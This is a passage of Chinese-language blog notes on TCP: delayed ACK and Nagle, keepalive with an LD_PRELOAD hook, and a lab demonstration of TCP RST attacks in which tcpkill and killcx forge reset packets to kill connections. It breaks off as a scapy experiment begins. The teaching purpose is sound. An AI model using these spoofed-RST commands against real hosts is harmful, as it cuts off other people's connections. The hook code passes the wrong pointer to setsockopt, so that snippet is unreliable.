class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class DelayAckClient &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        Socket socket &#x3D; new Socket();</span><br><span class="line">        socket.connect(new InetSocketAddress(&quot;server_ip&quot;, 8888));</span><br><span class="line">        InputStream inputStream &#x3D; socket.getInputStream();</span><br><span class="line">        OutputStream outputStream &#x3D; socket.getOutputStream();</span><br><span class="line">        BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">        String head &#x3D; &quot;hello, &quot;;</span><br><span class="line">        String body &#x3D; &quot;world\n&quot;;</span><br><span class="line"></span><br><span class="line">        for (int i &#x3D; 0; i &lt; 10; i++) &#123;</span><br><span class="line">            long start &#x3D; System.currentTimeMillis();</span><br><span class="line">            outputStream.write((&quot;#&quot; + i + &quot; &quot; + head).getBytes()); &#x2F;&#x2F; write</span><br><span class="line">            outputStream.write((body).getBytes()); &#x2F;&#x2F; write</span><br><span class="line">            String line &#x3D; reader.readLine(); &#x2F;&#x2F; read</span><br><span class="line">            System.out.println(&quot;RTT: &quot; + (System.currentTimeMillis() - start) + &quot;: &quot; + line);</span><br><span class="line">        &#125;</span><br><span class="line">        inputStream.close();</span><br><span class="line">        outputStream.close();</span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">javac DelayAckClient.java; java -cp . DelayAckClient</span><br><span class="line">RTT: 1: #0 hello, world</span><br><span class="line">RTT: 44: #1 hello, world</span><br><span class="line">RTT: 46: #2 hello, world</span><br><span class="line">RTT: 44: #3 hello, world</span><br><span class="line">RTT: 42: #4 hello, world</span><br><span class="line">RTT: 41: #5 hello, world</span><br><span class="line">RTT: 41: #6 hello, world</span><br><span class="line">RTT: 44: #7 hello, world</span><br><span class="line">RTT: 44: #8 hello, world</span><br><span class="line">RTT: 44: #9 hello, world</span><br></pre></td></tr></table></figure>
<p>除了第一次，剩下的 RTT 全为 40 多毫秒。这刚好是 Linux 延迟确认定时器的时间 40ms 抓包结果如下: </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/165.jpg"></p>
<p>对包逐个分析一下 1 ~ 3：三次握手 4 ~ 9：第一次 for 循环的请求，也就是 W-W-R 的过程</p>
<pre><code>4：客户端发送 &quot;#0 hello, &quot; 给服务端
5：因为服务端只收到了数据还没有回复过数据，tcp 判断不是 pingpong 的交互式数据，属于 quickack 模式，立刻回复 ACK
6：客户端发送 &quot;world\n&quot; 给服务端
7：服务端因为还没有回复过数据，tcp 判断不是 pingpong 的交互式数据，服务端立刻回复 ACK
8：服务端读到换行符，readline 函数返回，会把读到的字符串原样写入到客户端。TCP 这个时候检测到是 pingpong 的交互式连接，进入延迟确认模式
9：客户端收到数据以后回复 ACK</code></pre>
<p>10 ~ 14：第二次 for 循环</p>
<pre><code>10：客户端发送 &quot;#1 hello, &quot; 给服务端。服务端收到数据包以后，因为处于 pingpong 模式，开启一个 40ms 的定时器，奢望在 40ms 内有数据回传
11：很不幸，服务端等了 40ms 定期器到期都没有数据回传，回复确认 ACK 同时取消 pingpong 状态
12：客户端发送 &quot;world\n&quot; 给服务端
13：因为服务端不处于 pingpong 状态，所以收到数据立即回复 ACK
14：服务端读到换行符，readline 函数返回，会把读到的字符串原样写入到客户端。这个时候又检测到收发数据了，进入 pingpong 状态。</code></pre>
<p>从第二次 for 开始，后面的数据包都一样了。 整个过程包交互图如下： </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/166.jpg"></p>
<h3 id="用-packetdrill-模拟延迟确认"><a href="#用-packetdrill-模拟延迟确认" class="headerlink" title="用 packetdrill 模拟延迟确认"></a>用 packetdrill 模拟延迟确认</h3><h3 id="可以设置关掉延迟确认吗？"><a href="#可以设置关掉延迟确认吗？" class="headerlink" title="可以设置关掉延迟确认吗？"></a>可以设置关掉延迟确认吗？</h3><p>这个是我刚开始学习 TCP 的一个疑惑，既然是 TCP 的一个特性，那有没有一个开关可以开启或者关闭延迟确认呢？ 答案是否定的，大部分 Linux 实现上并没有开关可以关闭延迟确认。我曾经以为它是一个 sysctl 项，可是后来找了很久都没有找到，<code>没有办法</code>通过一个配置<code>彻底关掉</code>或者开启 Linux 的延迟确认。</p>
<h3 id="当-Nagle-算法遇到延迟确认"><a href="#当-Nagle-算法遇到延迟确认" class="headerlink" title="当 Nagle 算法遇到延迟确认"></a>当 Nagle 算法遇到延迟确认</h3><p>Nagle 算法和延迟确认本身并没有什么问题，但<code>一起使用</code>就会出现很<code>严重</code>的<code>性能问题</code>了。Nagle 攒着包一次发一个，延迟确认收到包不马上回。</p>
<p>如果我们把上面的 Java 代码稍作调整，禁用 Nagle 算法可以试一下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Socket socket &#x3D; new Socket();</span><br><span class="line">socket.setTcpNoDelay(true); &#x2F;&#x2F; 禁用 Nagle 算法</span><br><span class="line">socket.connect(new InetSocketAddress(&quot;server ip&quot;, 8888));</span><br></pre></td></tr></table></figure>
<p>运行 Client 端，可以看到 RTT 几乎为 0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">RTT: 1: #0 hello, world</span><br><span class="line">RTT: 0: #1 hello, world</span><br><span class="line">RTT: 1: #2 hello, world</span><br><span class="line">RTT: 1: #3 hello, world</span><br><span class="line">RTT: 0: #4 hello, world</span><br><span class="line">RTT: 1: #5 hello, world</span><br><span class="line">RTT: 1: #6 hello, world</span><br><span class="line">RTT: 0: #7 hello, world</span><br><span class="line">RTT: 1: #8 hello, world</span><br><span class="line">RTT: 0: #9 hello, world</span><br></pre></td></tr></table></figure>
<p>抓包结果如下</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/167.jpg"></p>
<p>黑色背景部分的是客户端发送给服务端的请求包，可以看到在禁用 Nagle 的情况下，不用等一个包发完再发下一个，而是几乎同时把两次写请求发送出来了。服务端收到带换行符的包以后，立马可以返回结果，ACK 可以捎带过去，就不会出现延迟 40ms 的情况。</p>
<h3 id="小结-16"><a href="#小结-16" class="headerlink" title="小结"></a>小结</h3><p>这篇文章主要介绍了延迟确认出现的背景和原因，然后用一个实际的代码演示了延迟确认的具体的细节。到这里 <code>Nagle 算法</code>和<code>延迟确认</code>这两个主题就介绍完毕了。</p>
<h2 id="28-兄弟你还活着吗-——-keepalive-原理"><a href="#28-兄弟你还活着吗-——-keepalive-原理" class="headerlink" title="28 兄弟你还活着吗 —— keepalive 原理"></a>28 兄弟你还活着吗 —— keepalive 原理</h2><p>一个 TCP 连接上，如果通信双方都不向对方发送数据，那么 TCP 连接就不会有任何数据交换。这就是我们今天要讲的 TCP keepalive 机制的由来。</p>
<h3 id="永远记住-TCP-不是轮询的协议"><a href="#永远记住-TCP-不是轮询的协议" class="headerlink" title="永远记住 TCP 不是轮询的协议"></a>永远记住 TCP 不是轮询的协议</h3><p>网络故障或者系统宕机都将使得对端无法得知这个消息。如果应用程序不发送数据，可能永远无法得知该连接已经失效。假设应用程序是一个 web 服务器，客户端发出三次握手以后故障宕机或被踢掉网线，对于 web 服务器而已，下一个数据包将永远无法到来，但是它一无所知。TCP 不会采用类似于轮询的方式来询问：小老弟你有什么东西要发给我吗？</p>
<p>这种情况下服务端会永远处于 ESTABLISHED 吗？</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/168.jpg"></p>
<h3 id="TCP-的-half-open"><a href="#TCP-的-half-open" class="headerlink" title="TCP 的 half open"></a>TCP 的 half open</h3><p>上面所说的情况就是典型的 TCP「半打开 half open」</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这一个情况就是如果在未告知另一端的情况下通信的一端关闭或终止连接，那么就认为该条TCP连接处于半打开状态。 这种情况发现在通信的一方的主机崩溃、电源断掉的情况下。 只要不尝试通过半开连接来传输数据，正常工作的一端将不会检测出另外一端已经崩溃。</span><br></pre></td></tr></table></figure>
<h3 id="模拟客户端网络故障"><a href="#模拟客户端网络故障" class="headerlink" title="模拟客户端网络故障"></a>模拟客户端网络故障</h3><p>准备两台虚拟机 c1（服务器），c2（客户端）。在 c1 上执行 <code>nc -l 8080</code> 启动一个 TCP 服务器监听 <code>8080</code> 端口，同时在服务器 c1 上执行 <code>tcpdump</code> 查看包发送的情况。 在 c2 上用 <code>nc c1 8080</code>创建一条 TCP 连接 在 c1 上执行 <code>netstat</code> 查看连接状态，可以看到服务端已处于 <code>ESTABLISHED</code> 状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo netstat -lnpa | grep -i 8080</span><br><span class="line">tcp        0      0 10.211.55.5:8080        10.211.55.10:60492      ESTABLISHED 2787&#x2F;nc</span><br></pre></td></tr></table></figure>
<p>这时断掉 c1 的网络连接，可以看到 <code>tcpdump</code> 抓包没有任何包交互。此时再用 netstat 查看，发现连接还是处于 ESTABLISHED 状态。</p>
<p>过了几个小时以后再来查看，依旧是 ESTABLISHED 状态，且 tcpdump 输出显示没有任何包传输。</p>
<h3 id="TCP-的-keepalive"><a href="#TCP-的-keepalive" class="headerlink" title="TCP 的 keepalive"></a>TCP 的 keepalive</h3><p>TCP 协议的设计者考虑到了这种检测长时间死连接的需求，于是乎设计了 keepalive 机制。 在我的 CentOS 机器上，keepalive 探测包发送数据 <code>7200s</code>，探测 9 次，每次探测间隔 75s，这些值都有对应的参数可以配置。</p>
<p>为了能更快的演示，修改 centos 机器上 keepalive 相关的参数如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 30s没有数据包交互发送 keepalive 探测包</span><br><span class="line">echo 30 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_keepalive_time</span><br><span class="line">&#x2F;&#x2F; 每次探测TCP 包间隔</span><br><span class="line">echo 10 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_keepalive_intvl</span><br><span class="line">&#x2F;&#x2F; 探测多少次</span><br><span class="line">echo 5 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_keepalive_probes</span><br></pre></td></tr></table></figure>
<p>默认情况下 nc 是没有开启 keepalive 的，怎么样在不修改 nc 源码的情况下，让它拥有 keepalive 的功能呢？</p>
<p>正常情况下，我们设置 tcp 的 keepalive 选项的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int flags &#x3D; 1;</span><br><span class="line">setsockopt(socket_fd, SOL_TCP, TCP_KEEPALIVE, (void *)&amp;flags, sizeof(flags)</span><br></pre></td></tr></table></figure>
<p>我们可以用 strace 看下 <code>nc -l 8080</code>背后的系统调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) &#x3D; 4</span><br><span class="line">setsockopt(4, SOL_SOCKET, SO_REUSEADDR, [1], 4) &#x3D; 0</span><br><span class="line">bind(4, &#123;sa_family&#x3D;AF_INET, sin_port&#x3D;htons(8080), sin_addr&#x3D;inet_addr(&quot;0.0.0.0&quot;)&#125;, 128) &#x3D; 0</span><br><span class="line">listen(4, 10)</span><br></pre></td></tr></table></figure>
<p>可以看到 nc 只调用 setsockopt 设置了 SO_REUSEADDR 允许端口复用，并没有设置 TCP_KEEPALIVE，那我们 hook 一下 setsockopt 函数调用，让它在设置端口复用的同时设置 TCP_KEEPALIVE。那怎么样来做 hook 呢？</p>
<h3 id="偷梁换柱之-LD-PRELOAD"><a href="#偷梁换柱之-LD-PRELOAD" class="headerlink" title="偷梁换柱之 LD_PRELOAD"></a>偷梁换柱之 LD_PRELOAD</h3><p>LD_PRELOAD 是一个 Linux 的环境变量，运行在程序运行前优先加载动态链接库，类似于 Java 的字节码改写 instrument。通过这个环境变量，我们可以修改覆盖真正的系统调用，达到我们的目的。 这个过程如下： </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/169.jpg"></p>
<p>新建文件 setkeepalive.c，全部代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">static int (*real_setsockopt)(int , int , int , void *, socklen_t) &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) void init() &#123;</span><br><span class="line">    real_setsockopt &#x3D; dlsym(RTLD_NEXT, &quot;setsockopt&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int setsockopt(int sockfd, int level, int optname,</span><br><span class="line">               const void *optval, socklen_t optlen) &#123;</span><br><span class="line">        printf(&quot;SETSOCKOPT: %d: level: %d %d&#x3D;%d (%d)\r\n&quot;,</span><br><span class="line"> sockfd, level, optname, *(int*)optval, optlen);</span><br><span class="line">        &#x2F;&#x2F; 调用原函数</span><br><span class="line">        real_setsockopt(sockfd, level, optname, &amp;optval, optlen);</span><br><span class="line">        &#x2F;&#x2F; 判断是否是 SO_REUSEADDR</span><br><span class="line">        if (level &#x3D;&#x3D; SOL_SOCKET &amp;&amp; optname &#x3D;&#x3D; SO_REUSEADDR) &#123;</span><br><span class="line">                int val &#x3D; 1;</span><br><span class="line">                &#x2F;&#x2F; 设置 SO_KEEPALIVE</span><br><span class="line">                real_setsockopt(sockfd, SOL_SOCKET, SO_KEEPALIVE, &amp;val, optlen);</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译上面的 setkeepalive.c 文件为 .so 文件： <code>gcc setkeepalive.c -fPIC -D_GNU_SOURCE -shared -ldl -o setkeepalive.so</code> </p>
<p>替换并测试运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD&#x3D;.&#x2F;setkeepalive.so nc -l 8080</span><br></pre></td></tr></table></figure>
<p>再来重复上面的测试流程，抓包如下：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/170.jpg"></p>
<p>完美的展现了 keepalive 包的探测的过程: 1 ~ 3：三次握手，随后模拟客户端断网 4：30s 以后服务端发送第一个探测包（对应 tcp_keepalive_time） 5 ~ 8：因探测包一直没有回应，每隔 10s 发出剩下的 4 次探测包 9：5 次探测包以后，服务端觉得没有希望了，发出 RST 包，断掉这个连接</p>
<h3 id="为什么大部分应用程序都没有开启-keepalive-选项"><a href="#为什么大部分应用程序都没有开启-keepalive-选项" class="headerlink" title="为什么大部分应用程序都没有开启 keepalive 选项"></a>为什么大部分应用程序都没有开启 keepalive 选项</h3><p>现在大部分应用程序（比如我们刚用的 nc）都没有开启 keepalive 选项，一个很大的原因就是默认的超时时间太长了，从没有数据交互到最终判断连接失效，需要花 2.1875 小时（7200 + 75 * 9），显然太长了。但如果修改这个值到比较小，又违背了 keepalive 的设计初衷（为了检查长时间死连接）</p>
<h3 id="对我们的启示"><a href="#对我们的启示" class="headerlink" title="对我们的启示"></a>对我们的启示</h3><p>在应用层做连接的有效性检测是一个比较好的实践，也就是我们常说的<code>心跳包</code>。</p>
<h3 id="小结-17"><a href="#小结-17" class="headerlink" title="小结"></a>小结</h3><p>这篇文章我们介绍了 TCP keepalive 机制的由来，通过定时发送探测包来探测连接的对端是否存活，不过默认情况下需要 7200s 没有数据包交互才会发送 <code>keepalive</code> 探测包，往往这个时间太久了，我们熟知的很多组件都没有开启 <code>keepalive</code> 特性，而是选择在应用层做心跳机制。</p>
<h3 id="思考题-2"><a href="#思考题-2" class="headerlink" title="思考题"></a>思考题</h3><p>TCP 的 keepalive 与 HTTP 的 keep-alive 有什么区别？</p>
<p>HTTP的keep-alive针对于一次HTTP响应对应一次tcp的，有了keep-alive之后一次HTTP可以对应多次tcp. 具体来说就是， 比如http设置的keep-alive为120s，然后当一次http响应结束后，不是立即关闭这个tcp连接，而是等120s,如果120s内没有http请求之类的过来，那么就断开这次tcp。但是如果这120s内再次来了http，那么129s又归零，结束http响应后重写计时。这样就出现了一次tcp对应多次http的现象。</p>
<h2 id="29-TCP-RST-攻击与如何杀掉一条-TCP-连接"><a href="#29-TCP-RST-攻击与如何杀掉一条-TCP-连接" class="headerlink" title="29 TCP RST 攻击与如何杀掉一条 TCP 连接"></a>29 TCP RST 攻击与如何杀掉一条 TCP 连接</h2><p>这篇文章我们来介绍 TCP RST 攻击以及如何在不干预通信双方进程的情况下杀掉一条 TCP 连接。</p>
<h3 id="RST-攻击"><a href="#RST-攻击" class="headerlink" title="RST 攻击"></a>RST 攻击</h3><p>RST 攻击也称为伪造 TCP 重置报文攻击，通过伪造 RST 报文来关闭掉一个正常的连接。</p>
<p>源 IP 地址伪造非常容易，不容易被伪造的是序列号，RST 攻击最重要的一点就是构造的包的序列号要落在对方的滑动窗口内，否则这个 RST 包会被忽略掉，达不到攻击的效果。</p>
<p>下面来介绍两个工具，利用 RST 攻击的方式来杀掉一条连接。</p>
<h3 id="工具一：tcpkill-工具使用及原理介绍"><a href="#工具一：tcpkill-工具使用及原理介绍" class="headerlink" title="工具一：tcpkill 工具使用及原理介绍"></a>工具一：tcpkill 工具使用及原理介绍</h3><p>Centos 下安装 tcpkill 命令步骤如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release -y</span><br><span class="line">yum install dsniff -y</span><br></pre></td></tr></table></figure>
<p>实验步骤： 1、机器 c2(10.211.55.10) 启动 nc 命令监听 8080 端口，充当服务器端，记为 B</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8080</span><br></pre></td></tr></table></figure>
<p>2、机器 c2 启动 tcpdump 抓包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i any port 8080 -nn -U -vvv -w test.pcap</span><br></pre></td></tr></table></figure>
<p>3、本地机器终端（10.211.55.2，记为 A）使用 nc 与 B 的 8080 端口建立 TCP 连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc c2 8080</span><br></pre></td></tr></table></figure>
<p>在服务端 B 机器上可以看到这条 TCP 连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -nat | grep -i 8080</span><br><span class="line">tcp        0      0 10.211.55.10:8080       10.211.55.2:60086       ESTABLISHED</span><br></pre></td></tr></table></figure>
<p>4、启动 tcpkill</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpkill -i eth0 port 8080</span><br></pre></td></tr></table></figure>
<p>注意这个时候 tcp 连接依旧安然无恙，并没有被杀掉。</p>
<p>5、在本地机器终端 nc 命令行中随便输入一点什么，这里输入hello，发现这时服务端和客户端的 nc 进程已经退出了</p>
<p>下面来分析抓包文件.<br><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/171.jpg"></p>
<p>可以看到，tcpkill 假冒了 A 和 B 的 IP发送了 RST 包给通信的双方，那问题来了，伪造 ip 很简单，它是怎么知道当前会话的序列号的呢？</p>
<p>tcpkill 的原理跟 tcpdump 差不多，会通过 libpcap 库抓取符合条件的包。 因此只有有数据传输的 tcp 连接它才可以拿到当前会话的序列号，通过这个序列号伪造 IP 发送符合条件的 RST 包。</p>
<p>原理如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/172.jpg"></p>
<p>可以看到 tcpkill 对每个端发送了 3 个RST 包，这是因为在高速数据传输的连接上，根据当前抓的包计算的序列号可能已经不再 TCP 连接的窗口内了，这种情况下 RST 包会被忽略，因此默认情况下 tcpkill 未雨绸缪往后计算了几个序列号。还可以指定参数-n指定更多的 RST 包，比如<code>tcpkill -9</code></p>
<p>根据上面的分析 tcpkill 的局限还是很明显的，无法杀掉一条僵死连接，下面我们介绍一个新的工具 killcx，看看它是如何来处理这种情况的。</p>
<h3 id="killcx"><a href="#killcx" class="headerlink" title="killcx"></a>killcx</h3><p>killcx 是一个用 perl 写的在 linux 下可以关闭 TCP 连接的脚本，无论 TCP 连接处于什么状态。</p>
<p>下面来做一下实验，实验的前几步骤跟第一个例子中一模一样</p>
<p>1、机器 c2(10.211.55.10) 启动 nc 命令监听 8080 端口，充当服务器端，记为 B</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8080</span><br></pre></td></tr></table></figure>
<p>2、机器 c2 启动 tcpdump 抓包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i any port 8080 -nn -U -vvv -w test.pcap</span><br></pre></td></tr></table></figure>
<p>3、本地机器终端（10.211.55.2，记为 A）使用 nc 与 B 的 8080 端口建立 TCP 连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc c2 8080</span><br></pre></td></tr></table></figure>
<p>在服务端 B 机器上可以看到这条 TCP 连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -nat | grep -i 8080</span><br><span class="line">tcp        0      0 10.211.55.10:8080       10.211.55.2:61632       ESTABLISHED</span><br></pre></td></tr></table></figure>
<p>4、客户端 A nc 命令行随便输入什么，这一步也完全可以省略，这里输入”hello\n”</p>
<p>5、执行 killcx 命令，注意 killcx 是在步骤 4 之后执行的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;killcx 10.211.55.2:61632</span><br></pre></td></tr></table></figure>
<p>可以看到服务端和客户端的 nc 进程已经退出了。</p>
<p>抓包的结果如下</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/173.jpg"></p>
<p>前 5 个包都很正常，三次握手加上一次数据传输，有趣的事情从第 6 个包开始</p>
<pre><code>第 6 个包是 killcx 伪造 IP 向服务端 B 发送的一个 SYN 包
第 7 个包是服务端 B 回复的 ACK 包，里面包含的 SEQ 和 ACK 号
第 8 个包是 killcx 伪造 IP 向服务端 B 发送的 RST 包
第 9 个包是 killcx 伪造 IP 向客户端 A 发送的 RST 包</code></pre>
<p>整个过程如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/174.jpg"></p>
<h3 id="小结-18"><a href="#小结-18" class="headerlink" title="小结"></a>小结</h3><p>这篇文章介绍了杀掉 TCP 连接的两个工具 tcpkill 和 killcx：</p>
<p>●<code>tcpkill</code> 采用了比较保守的方式，抓取流量等有新包到来的时候，获取 SEQ/ACK 号，这种方式只能杀掉有数据传输的连接</p>
<p>●<code>killcx</code>采用了更加主动的方式，主动发送 SYN 包获取 SEQ/ACK 号，这种方式活跃和非活跃的连接都可以杀掉</p>
<h3 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h3><p>有大神把 tcpkill 源代码魔改了一下，让 tcpkill 也支持了杀掉非活跃连接，原理上就是结合了 killcx 杀掉连接的方式，模拟 SYN 包。</p>
<h2 id="30-ESTABLISHED-状态的连接收到-SYN-会回复什么？"><a href="#30-ESTABLISHED-状态的连接收到-SYN-会回复什么？" class="headerlink" title="30 ESTABLISHED 状态的连接收到 SYN 会回复什么？"></a>30 ESTABLISHED 状态的连接收到 SYN 会回复什么？</h2><p>最初这个问题是读者上一个小册中的一个留言提出的：「处于 ESTABLISHED 的连接，为什么还要响应 SYN 包？」，这篇文章就来聊聊这一部分的内容。</p>
<p>通过阅读这篇文章，你会了解到这些知识</p>
<pre><code>ESTABLISHED 状态的连接收到乱序包会回复什么
Challenge ACK 的概念
ACK 报文限速是什么鬼
SystemTap 工具在 linux 内核追踪中的使用
包注入神器 scapy 的使用
RST 攻击的原理
killcx 等工具利用 RST 攻击的方式来杀掉连接的原理</code></pre>
<p>接下来开始文章的内容。</p>
<h3 id="scapy-实验复现现象"><a href="#scapy-实验复现现象" class="headerlink" title="scapy 实验复现现象"></a>scapy 实验复现现象</h3><p>实验步骤如下：</p>
<p>在机器 A(10.211.55.10) 使用 nc 启动一个服务程序，监听 9090 端口，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -4 -l 9090</span><br></pre></td></tr></table></figure>
<p>机器 A 上同步使用 tcpdump 抓包，其中 -S 表示显示绝对序列号。</p>
